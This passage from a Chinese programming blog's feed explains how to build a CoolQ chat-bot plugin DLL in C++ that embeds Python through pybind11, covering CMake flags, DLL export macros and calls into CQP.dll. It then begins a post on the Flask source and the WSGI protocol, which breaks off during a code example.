&lt;h2 id="背景">背景&lt;/h2>
&lt;p>想给最近在玩的酷 Q 写个插件，发现没有合适的直接使用 Python 的解决方案。&lt;/p>
&lt;p>Richard Chien 提供了一个比较通用的插件，&lt;code>CQHttp&lt;/code>。&lt;code>CQHttp&lt;/code>本体是用 C++ 编写的插件，将酷 Q 的回调包装成 HTTP 请求转发至指定的地址，支持&lt;code>http&lt;/code>和&lt;code>websocket&lt;/code>两种协议。&lt;/p>
&lt;p>不过由于个人想折腾折腾的想法，打算试试把 Python 解释器直接嵌入到 C++ 里得了。&lt;/p>
&lt;!-- more -->
&lt;p>整个思路如下。&lt;/p>
&lt;pre>&lt;code class="language-mermaid" data-lang="mermaid">graph LR;
CQP[酷Q] --事件回调--&amp;gt; dll[插件DLL];
dll --事件回调--&amp;gt; python[Python脚本];
python --调用API--&amp;gt; dll;
dll --调用API--&amp;gt; CQP;
&lt;/code>&lt;/pre>&lt;h2 id="依赖">依赖&lt;/h2>
&lt;p>为了简化操作 Python 接口，我没有使用 Python 自带的 C API，而是&lt;code>pybind11&lt;/code>，使用&lt;code>vcpkg&lt;/code>管理依赖。&lt;/p>
&lt;p>安装命令：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-batch" data-lang="batch">vcpkg install pybind11:x86-windows
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="0x1-编译-dll">0x1 编译 DLL&lt;/h2>
&lt;p>我使用 CMake 作为编译系统，因此可以很简单地写一个编译出 DLL 的 &lt;code>CMakeLists.txt&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-cmake" data-lang="cmake">&lt;span class="nb">cmake_minimum_required&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">VERSION&lt;/span> &lt;span class="s">3.15&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="err">
&lt;/span>&lt;span class="err">&lt;/span>&lt;span class="nb">project&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">top.weak-ptr.cqpy&lt;/span> &lt;span class="s">LANGUAGES&lt;/span> &lt;span class="s">CXX&lt;/span> &lt;span class="s">VERSION&lt;/span> &lt;span class="s">0.1.0&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="err">
&lt;/span>&lt;span class="err">
&lt;/span>&lt;span class="err">&lt;/span>&lt;span class="nb">include_directories&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">src&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="err">
&lt;/span>&lt;span class="err">&lt;/span>&lt;span class="nb">aux_source_directory&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">src&lt;/span> &lt;span class="s">SOURCES&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="err">
&lt;/span>&lt;span class="err">&lt;/span>&lt;span class="nb">set&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">CMAKE_CXX_STANDARD&lt;/span> &lt;span class="s">17&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="err">
&lt;/span>&lt;span class="err">
&lt;/span>&lt;span class="err">&lt;/span>&lt;span class="c"># 引入 pybind11
&lt;/span>&lt;span class="c">&lt;/span>&lt;span class="nb">find_package&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">pybind11&lt;/span> &lt;span class="s">CONFIG&lt;/span> &lt;span class="s">REQUIRED&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="err">
&lt;/span>&lt;span class="err">
&lt;/span>&lt;span class="err">&lt;/span>&lt;span class="c"># 添加 target
&lt;/span>&lt;span class="c">&lt;/span>&lt;span class="nb">set&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">OUT_NAME&lt;/span> &lt;span class="s2">&amp;#34;app&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="err">
&lt;/span>&lt;span class="err">&lt;/span>&lt;span class="nb">add_library&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">${&lt;/span>&lt;span class="nv">OUT_NAME&lt;/span>&lt;span class="o">}&lt;/span> &lt;span class="s">SHARED&lt;/span> &lt;span class="o">${&lt;/span>&lt;span class="nv">SOURCES&lt;/span>&lt;span class="o">}&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="err">
&lt;/span>&lt;span class="err">&lt;/span>&lt;span class="nb">set_target_properties&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">${&lt;/span>&lt;span class="nv">OUT_NAME&lt;/span>&lt;span class="o">}&lt;/span> &lt;span class="s">PROPERTIES&lt;/span> &lt;span class="s">LINKER_LANGUAGE&lt;/span> &lt;span class="s">CXX&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="err">
&lt;/span>&lt;span class="err">&lt;/span>&lt;span class="nb">target_link_libraries&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">${&lt;/span>&lt;span class="nv">OUT_NAME&lt;/span>&lt;span class="o">}&lt;/span> &lt;span class="s">PRIVATE&lt;/span> &lt;span class="s">pybind11::embed&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="err">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>源代码使用 MSVC 和 MinGW 编译，另外再处理下源码编码的问题和宏。&lt;/p>
&lt;p>主要涉及的几个问题：&lt;/p>
&lt;ol>
&lt;li>MSVC 编译时通过&lt;code>/utf-8&lt;/code>编译参数指定源码文件的编码。&lt;/li>
&lt;li>MSVC 编译&lt;code>pybind11&lt;/code>时需要指定 &lt;code>-DNOMINMAX&lt;/code>，这是&lt;code>pybind11&lt;/code>要求的。&lt;/li>
&lt;li>因为使用 VCPKG 管理依赖，MSVC 编译时还需要设置链接属性。&lt;/li>
&lt;li>MinGW 编译时，指定 &lt;code>-static&lt;/code> 避免依赖 &lt;code>libgcc&lt;/code> 之类的 dll，最终编译结果只依赖于 &lt;code>libpython3.7.dll&lt;/code>。&lt;/li>
&lt;li>MinGW 编译时，指定 &lt;code>-Wl,--kill-at,--enable-stdcall-fixup&lt;/code>，来确保导出的 DLL API 名字没有下划线开头和&lt;code>@&amp;lt;参数大小&amp;gt;&lt;/code>的后缀。&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-cmake" data-lang="cmake">&lt;span class="c"># 添加编译参数
&lt;/span>&lt;span class="c">&lt;/span>&lt;span class="nb">add_compile_definitions&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">APP_ID=&lt;/span>&lt;span class="s2">&amp;#34;${PROJECT_NAME}&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="err">
&lt;/span>&lt;span class="err">&lt;/span>&lt;span class="nb">add_definitions&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">-DAPP_ID=&lt;/span>&lt;span class="s2">&amp;#34;top.weak-ptr.cqpy&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="err">
&lt;/span>&lt;span class="err">&lt;/span>&lt;span class="nb">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="s">MSVC&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="err">
&lt;/span>&lt;span class="err">&lt;/span> &lt;span class="nb">add_compile_options&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">/utf-8&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="err">
&lt;/span>&lt;span class="err">&lt;/span> &lt;span class="nb">add_definitions&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">-DNOMINMAX&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="err">
&lt;/span>&lt;span class="err">
&lt;/span>&lt;span class="err">&lt;/span> &lt;span class="c"># 设置静态链接
&lt;/span>&lt;span class="c">&lt;/span> &lt;span class="nb">set&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">VCPKG_CRT_LINKAGE&lt;/span> &lt;span class="s">STATIC&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="err">
&lt;/span>&lt;span class="err">&lt;/span> &lt;span class="nb">set&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">VCPKG_LIBRARY_LINKAGE&lt;/span> &lt;span class="s">STATIC&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="err">
&lt;/span>&lt;span class="err">&lt;/span>&lt;span class="nb">else&lt;/span> &lt;span class="p">()&lt;/span>&lt;span class="err">
&lt;/span>&lt;span class="err">&lt;/span> &lt;span class="nb">add_link_options&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">-static&lt;/span> &lt;span class="s">-Wl,--kill-at,--enable-stdcall-fixup&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="err">
&lt;/span>&lt;span class="err">&lt;/span>&lt;span class="nb">endif&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="s">MSVC&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="err">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>最后的构建命令：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-batch" data-lang="batch">&lt;span class="k">mkdir&lt;/span> build
&lt;span class="k">cd&lt;/span> build
cmake .. \
&lt;span class="s2">&amp;#34;-GVisual Studio 16 2019&amp;#34;&lt;/span> \
-AWin32 \
-DCMAKE_TOOLCHAIN_FILE=/path/to/your/vcpkg/scripts/buildsystems/vcpkg.cmake \
cmake --build .
cmake install
&lt;/code>&lt;/pre>&lt;/div>&lt;p>MinGW 对应改下 Generator，去掉&lt;code>-AWin32&lt;/code>和后面的&lt;code>-DCMAKE_TOOLCHAIN_FILE=/path/to/your/vcpkg/scripts/buildsystems/vcpkg.cmake&lt;/code>即可。&lt;/p>
&lt;h2 id="0x2-msvc-编译导出-dll-的问题">0x2 MSVC 编译导出 DLL 的问题&lt;/h2>
&lt;p>参考 MSDN 的文档，使用下面的方式无法正确导出 DLL 接口。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-c++" data-lang="c++">&lt;span class="k">extern&lt;/span> &lt;span class="s">&amp;#34;C&amp;#34;&lt;/span> &lt;span class="kr">__declspec&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">dllexport&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="kt">int&lt;/span> &lt;span class="kr">__stdcall&lt;/span> &lt;span class="n">test&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">{}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>最终采用的是&lt;code>__pragma&lt;/code>的方式指定导出名，如下。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-c++" data-lang="c++">&lt;span class="cp">#define DLL_EXPORT extern &amp;#34;C&amp;#34; __declspec(dllexport)
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="cp">#define CQ_EXPORT(ReturnType, FuncName, ParamsSize, ...) \
&lt;/span>&lt;span class="cp"> __pragma( \
&lt;/span>&lt;span class="cp"> comment(linker, &amp;#34;/EXPORT:&amp;#34; #FuncName &amp;#34;=_&amp;#34; #FuncName &amp;#34;@&amp;#34; #ParamsSize)) \
&lt;/span>&lt;span class="cp"> DLL_EXPORT ReturnType __stdcall FuncName(__VA_ARGS__)
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>注意&lt;code>__pragma&lt;/code>只能在 MSVC 中使用，所以要加上条件判断。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-c++" data-lang="c++">&lt;span class="cp">#define DLL_EXPORT extern &amp;#34;C&amp;#34; __declspec(dllexport)
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="cp">#if defined(_MSC_VER)
&lt;/span>&lt;span class="cp">#define CQ_EXPORT(ReturnType, FuncName, ParamsSize, ...) \
&lt;/span>&lt;span class="cp"> __pragma( \
&lt;/span>&lt;span class="cp"> comment(linker, &amp;#34;/EXPORT:&amp;#34; #FuncName &amp;#34;=_&amp;#34; #FuncName &amp;#34;@&amp;#34; #ParamsSize)) \
&lt;/span>&lt;span class="cp"> DLL_EXPORT ReturnType __stdcall FuncName(__VA_ARGS__)
&lt;/span>&lt;span class="cp">#else
&lt;/span>&lt;span class="cp">#define CQ_EXPORT(ReturnType, FuncName, ParamsSize, ...) \
&lt;/span>&lt;span class="cp"> DLL_EXPORT ReturnType __stdcall FuncName(__VA_ARGS__)
&lt;/span>&lt;span class="cp">#endif
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>理论上也能用&lt;code>.def&lt;/code>文件来定义导出表，可以自行尝试下。&lt;/p>
&lt;h2 id="0x3-导入-cqpdll-的-api-的问题">0x3 导入 CQP.dll 的 API 的问题&lt;/h2>
&lt;p>首先要知道&lt;code>CQP.dll&lt;/code>也会加载到&lt;code>CQP.exe&lt;/code>中，插件也会加载到&lt;code>CQP.exe&lt;/code>中，所以我们需要的就是使用 Windows API 获取到&lt;code>CQP.dll&lt;/code>的 Handle 再进行操作。&lt;/p>
&lt;p>大致代码如下。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-c++" data-lang="c++">&lt;span class="k">const&lt;/span> &lt;span class="k">auto&lt;/span> &lt;span class="n">dll&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">GetModuleHandleW&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="sa">L&lt;/span>&lt;span class="s">&amp;#34;CQP.dll&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">const&lt;/span> &lt;span class="k">auto&lt;/span> &lt;span class="n">CQ_addLog&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="k">reinterpret_cast&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="kt">int32_t&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kr">__stdcall&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)(&lt;/span>&lt;span class="kt">int32_t&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="kt">int32_t&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="k">const&lt;/span> &lt;span class="kt">char&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="k">const&lt;/span> &lt;span class="kt">char&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">GetProcAddress&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">dll&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;CQ_addLog&amp;#34;&lt;/span>&lt;span class="p">));&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>通过两个 API 调用即可获得需要的函数指针了。&lt;/p>
&lt;h2 id="0x4-嵌入-python-解释器">0x4 嵌入 Python 解释器&lt;/h2>
&lt;p>到了这一步已经非常简单了，&lt;code>pybind11&lt;/code>提供了高度封装的 C++ API。可以直接参考&lt;a class="link" href="https://pybind11.readthedocs.io/en/stable/advanced/embedding.html" target="_blank" rel="noopener"
>这个文档&lt;/a>。&lt;/p>
&lt;p>再给个简单的例子代码：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-c++" data-lang="c++">&lt;span class="k">template&lt;/span> &lt;span class="o">&amp;lt;&lt;/span>&lt;span class="k">typename&lt;/span>&lt;span class="p">...&lt;/span> &lt;span class="n">Args&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>
&lt;span class="kr">inline&lt;/span> &lt;span class="kt">int32_t&lt;/span> &lt;span class="n">py_callback&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">const&lt;/span> &lt;span class="n">std&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">string&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">py_func&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">Args&lt;/span>&lt;span class="p">...&lt;/span> &lt;span class="n">args&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">auto&lt;/span> &lt;span class="n">guard&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">std&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">lock_guard&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">lock&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">try&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">auto&lt;/span> &lt;span class="n">m&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">py&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">module&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">import&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;cqpy._callback&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="n">m&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">attr&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">py_func&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">c_str&lt;/span>&lt;span class="p">())(&lt;/span>&lt;span class="n">args&lt;/span>&lt;span class="p">...).&lt;/span>&lt;span class="k">template&lt;/span> &lt;span class="n">cast&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="kt">int32_t&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="p">();&lt;/span>
&lt;span class="p">}&lt;/span> &lt;span class="k">catch&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="k">const&lt;/span> &lt;span class="n">py&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">error_already_set&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">e&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">logging&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">error&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">e&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">what&lt;/span>&lt;span class="p">());&lt;/span> &lt;span class="c1">// 记录 python 错误到日志
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">return&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="c1">// 启用插件
&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="n">CQ_EXPORT&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">int32_t&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">cq_event_enable&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">py&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">initialize_interpreter&lt;/span>&lt;span class="p">();&lt;/span>
&lt;span class="c1">// 设置 AUTH_CODE，但是暂时还不能使用酷Q的API
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">auto&lt;/span> &lt;span class="n">_embed&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">py&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">module&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">import&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;_embed&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="n">_embed&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">attr&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;AUTH_CODE&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">AUTH_CODE&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="c1">// 初始化 Python 解释器环境，把数据目录加入 python path
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">auto&lt;/span> &lt;span class="n">raw_app_dir&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">std&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">string&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">CQ_getAppDirectory&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">AUTH_CODE&lt;/span>&lt;span class="p">));&lt;/span>
&lt;span class="k">auto&lt;/span> &lt;span class="n">app_dir&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">py&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">bytes&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">raw_app_dir&lt;/span>&lt;span class="p">).&lt;/span>&lt;span class="n">attr&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;decode&amp;#34;&lt;/span>&lt;span class="p">)(&lt;/span>&lt;span class="s">&amp;#34;gb18030&amp;#34;&lt;/span>&lt;span class="p">).&lt;/span>&lt;span class="n">cast&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">py&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">str&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="p">();&lt;/span>
&lt;span class="k">auto&lt;/span> &lt;span class="n">sys&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">py&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">module&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">import&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;sys&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="n">sys&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">attr&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;path&amp;#34;&lt;/span>&lt;span class="p">).&lt;/span>&lt;span class="n">attr&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;append&amp;#34;&lt;/span>&lt;span class="p">)(&lt;/span>&lt;span class="n">app_dir&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="c1">// 初始化完成
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">logging&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">info&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;Python interpreter initialized.&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="nf">py_callback&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;on_enable&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>需要注意的是，虽然在前面通过相关参数指定了静态链接，但实际&lt;code>Python3.7.dll&lt;/code>还是动态链接上去的。&lt;/p>
&lt;p>所以分发这样编译出来的 dll，依然需要用户先安装一个 &lt;code>Python3.7&lt;/code>，或者把 &lt;code>Python3.7.dll&lt;/code> 也一起分发出去。&lt;/p>
&lt;p>如果要完全的静态链接，可能要自行编译 Python 源代码。实在太麻烦，就懒得弄了。&lt;/p>
&lt;h2 id="0x5-踩的坑">0x5 踩的坑&lt;/h2>
&lt;p>通过 Python 调用 C++ 端提供的 API 时，特别注意参数一定要一一对应，特别是数据类型，一旦不匹配或传入数据有误（例如 None），可能造成 C++ 端内存异常，需要挂调试器才能发现原因，非常麻烦。&lt;/p>
&lt;p>&lt;code>sys&lt;/code>是&lt;code>builtin&lt;/code>的库，和&lt;code>os&lt;/code>不同，如果分发的用户没有安装 Python，只有一个 &lt;code>Python3.7.dll&lt;/code>的话，很多 Python 自带的库是用不了的。例如说&lt;code>json&lt;/code>、&lt;code>logging&lt;/code>、甚至&lt;code>os&lt;/code>。这个应该算是常识，但最好一开始就意识到：你的用户还是要装一个 Python 才行。&lt;/p>
&lt;p>关于 VirtualEnv 支持，建议直接参考&lt;a class="link" href="https://www.python.org/dev/peps/pep-0405/" target="_blank" rel="noopener"
>PEP 405&lt;/a>。不多赘述。比较简单的处理就是把&lt;code>VENV\Lib\site-packages&lt;/code>加入到&lt;code>sys.path&lt;/code>里。&lt;/p>
&lt;p>能不能把所有 Python 代码和 dll 都打包进 dll 里？大致原理就是丢进&lt;code>rc&lt;/code>里，但实际很麻烦，看&lt;code>py2exe&lt;/code>迄今为止还有一大堆坑就知道有多麻烦了。&lt;/p></description></item><item><title>Flask源码阅读笔记：WSGI</title><link>https://nnnewb.github.io/blog/p/flask%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0wsgi/</link><pubDate>Sun, 17 Mar 2019 00:00:00 +0800</pubDate><guid>https://nnnewb.github.io/blog/p/flask%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0wsgi/</guid><description>&lt;h2 id="0-intro">0. Intro&lt;/h2>
&lt;p>Flask 是一个基于 WSGI 协议的上层应用框架，据我了解应该是和 Tornado、Django 流行程度相近，当然 Django 老大哥始终占据了最多的份额。Flask 是一个轻量级的 Micro Framework，源码值得一读。&lt;/p>
&lt;h2 id="1-回顾-wsgi">1. 回顾 WSGI&lt;/h2>
&lt;p>开始之前，需要先回顾以下 WSGI 协议。&lt;/p>
&lt;p>WSGI 是一个针对 Python 的协议，故说到的 App、Server、函数、参数等描述都是指 Python 对应的概念或实现。&lt;/p>
&lt;h3 id="11-pep-0333-到-pep-3333">1.1 PEP-0333 到 PEP-3333&lt;/h3>
&lt;p>PEP-0333 是初版的 WSGI 协议提案，PEP-3333 是 1.0.1 版本的 WSGI 提案，差别不大，主要是对 py3 和 py2 不兼容的部分作了更新说明（&lt;code>str&lt;/code>和&lt;code>unicode&lt;/code>方面的问题，python2 的 str 在 python3 是 bytes，故 python3 编写的 wsgi app 必须返回 bytes）。&lt;/p>
&lt;p>WSGI 协议规范了 Python Web 应用的两个层级：服务器层（Server）和应用层（Application），两者通过 WSGI 协议进行通信。&lt;/p>
&lt;p>其中 Server 负责处理请求，将请求转换成符合 WSGI 要求的模式（&lt;code>environ&lt;/code>参数）。 Application 完成处理后再通知 Server 返回 Response（&lt;code>start_response&lt;/code>参数）。&lt;/p>
&lt;p>WSGI 规定 App 必须是一个可以被调用的对象，接受指定数量的参数，WSGI Server 不关注任何其他 App 实现细节。而 WSGI App 也应当遵守这一要求，对 &lt;code>start_response&lt;/code> 参数也遵守不依赖于任何 WSGI Server 的实现细节。&lt;/p>
&lt;p>WSGI App 的接口规范声明如下。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="k">def&lt;/span> &lt;span class="nf">app&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">environ&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">start_response&lt;/span>&lt;span class="p">):&lt;/span> &lt;span class="o">...&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>start_response&lt;/code>的声明如下。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="k">def&lt;/span> &lt;span class="nf">start_response&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">status&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">response_headers&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">exc_info&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="kc">None&lt;/span>&lt;span class="p">):&lt;/span> &lt;span class="o">...&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="12-wsgi-server">1.2 WSGI Server&lt;/h3>
&lt;p>常见的 WSGI Server 有几个。Nginx 和 Apache 都有 WSGI 插件，除此之外还有 gunicorn、gevent.wsgi 等。&lt;/p>
&lt;p>举一个典型的例子来说。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="c1"># app.py&lt;/span>
&lt;span class="kn">import&lt;/span> &lt;span class="nn">wsgiserver&lt;/span>
&lt;span class="k">def&lt;/span> &lt;span class="nf">app&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">environ&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">start_response&lt;/span>&lt;span class="p">):&lt;/span>
&lt;span class="n">start_response&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;200 OK&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">[(&lt;/span>&lt;span class="s1">&amp;#39;Content-Type&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s1">&amp;#39;text-plain&amp;#39;&lt;/span>&lt;span class="p">)])&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="sa">b&lt;/span>&lt;span class="s2">&amp;#34;Hello world!&amp;#34;&lt;/span>&lt;span class="p">]&lt;/span>
